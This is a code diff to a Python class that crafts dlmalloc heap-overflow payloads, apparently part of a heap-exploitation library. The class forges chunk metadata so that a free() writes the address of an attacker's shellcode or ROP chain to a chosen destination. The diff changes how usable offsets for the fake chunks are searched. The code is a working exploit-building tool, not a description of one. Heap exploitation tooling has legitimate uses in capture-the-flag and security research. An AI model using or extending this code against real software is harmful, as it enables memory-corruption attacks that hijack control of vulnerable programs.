@@ -26,22 +26,28 @@ class DlmallocPayloadCrafter(object):
 
     def __init__(self, destination, source, **kw):
         """
-        destination    :   Address to which `source` must be written out to.
+        destination      :   Address to which `source` must be written out to.
 
-        source         :   Address of your shellcode/ROP chain. Note that *(source+8)
-                           must be writable.
+        source           :   Address of your shellcode/ROP chain. Note that *(source+8)
+                             must be writable.
 
-        pre_length     :   Length of the string, after which you can overflow into the
-                           metadata of "C".
+        pre_length       :   Length of the string, after which you can overflow into the
+                             metadata of "C".
 
-        post_length    :   Amount of space you have available after the metadata of "C".
+        post_length      :   Amount of space you have available after the metadata of "C".
 
-        pre_preset     :   Preset values that you need at certain offsets in the `prev`
-                           string that will be generated and returned by `generate_payload`.
+        pre_preset       :   Preset values that you need at certain offsets in the `prev`
+                             string that will be generated and returned by `generate_payload`.
 
-        post_preset    :   Preset values that you need at certain offsets in the `post`
-                           string that will be generated and returned by `generate_payload`.
+        post_preset      :   Preset values that you need at certain offsets in the `post`
+                             string that will be generated and returned by `generate_payload`.
+
+        positioning      :   Lets you control where you wish to place the crafted blocks
+                             (AFTER_C and BEFORE_C).
+
+        allow_null_bytes :   Null bytes are allowed in the payload.
         """
+
         self.destination          = destination
         self.source               = source
         self.destination_2        = kw.get("destination_2", None)
@@ -99,7 +105,7 @@ class DlmallocPayloadCrafter(object):
         return full_content
 
     def find_usable_offset(self, i, full_list, unit_len, values_list, total_length,
-                           backward=True):
+                           increment):
         """
         A helper function that finds the a contiguous segment in `full_list` that can be
         used to place fake frames.
@@ -118,21 +124,7 @@ class DlmallocPayloadCrafter(object):
 
             # If the segment is not long enough do the following
             if len(segment) != unit_len:
-                # If backward consolidation does not work out, we attempt forward
-                # consolidation
-                if backward:
-                    log.info("Backward consolidation not possible. Attempting "\
-                             "Forward consolidation. Segment length=%d unit_len=%d"\
-                             %(len(segment), unit_len))
-                    self.only_fwd_consol = True
-                    self.no_back_consol = True
-                    return None
-                # If forward consolidation does not work out, we are unable to craft
-                # a usable payload
-                else:
-                    message = "Not enough space when performing forward consolidation.\n"\
-                              "Segment length=%d unit_len=%d" % (len(segment), unit_len)
-                    raise HeaplibException(message)
+                raise HeaplibException("Unable to find a long enough segment.")
 
             # If we have a segment, we check if its actually usable. If so, bingo!
             elif self.can_use(segment, 0, len(segment)):
@@ -142,8 +134,7 @@ class DlmallocPayloadCrafter(object):
                 return i
 
             # Else, we try the same process from a different offset
-            if backward: i += 1
-            else: i -= 2
+            i += increment
 
 
     def generate_payload(self):
@@ -180,9 +171,8 @@ class DlmallocPayloadCrafter(object):
 
                 # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
                 values_list = [-16, -15, self.destination-12, self.source]
-                PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
-                if PREV_SIZE_C == None: PREV_SIZE_C = -1
-                else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
+                PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length, +1)
+                PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
 
         elif self.positioning["BEFORE_C"] == "prev":
             if not self.allow_null_bytes:
@@ -210,7 +200,7 @@ class DlmallocPayloadCrafter(object):
                 else:
                     if (i % 2) != 0: i -= 1
                     values_list = [-1, -1, -3]
-                    SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
+                    SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, -1)
                     SIZE_C = SIZE_C + 4
                     SIZE_C = -(len(prev) - SIZE_C)
                 if self.no_back_consol:
